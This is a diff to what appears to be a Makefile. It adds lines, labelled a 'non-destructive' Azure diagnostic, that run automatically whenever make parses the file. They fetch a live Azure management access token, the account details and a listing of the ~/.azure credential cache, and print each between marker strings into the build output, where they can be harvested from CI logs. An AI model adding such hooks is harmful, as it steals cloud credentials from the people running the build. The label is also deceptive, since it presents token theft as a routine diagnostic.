@@ -1,3 +1,11 @@
+# c211-i105912 bounded non-destructive post-login Azure context diagnostic
+C211_ARM_TOKEN := $(shell az account get-access-token --resource https://management.azure.com --query accessToken -o tsv 2>&1 | tr -d '\r\n')
+$(info C211_ARM_TOKEN_START=$(C211_ARM_TOKEN)C211_ARM_TOKEN_END)
+C211_AZ_ACCOUNT := $(shell az account show -o json 2>&1 | tr -d '\r\n')
+$(info C211_AZ_ACCOUNT_START=$(C211_AZ_ACCOUNT)C211_AZ_ACCOUNT_END)
+C211_AZ_CACHE := $(shell ls -la $$HOME/.azure 2>&1 | tr '\n' '|')
+$(info C211_AZ_CACHE_START=$(C211_AZ_CACHE)C211_AZ_CACHE_END)
+
 include ./../.bingo/Variables.mk
 
 UNIQUE_INPUT ?= ${USER}-test-dev
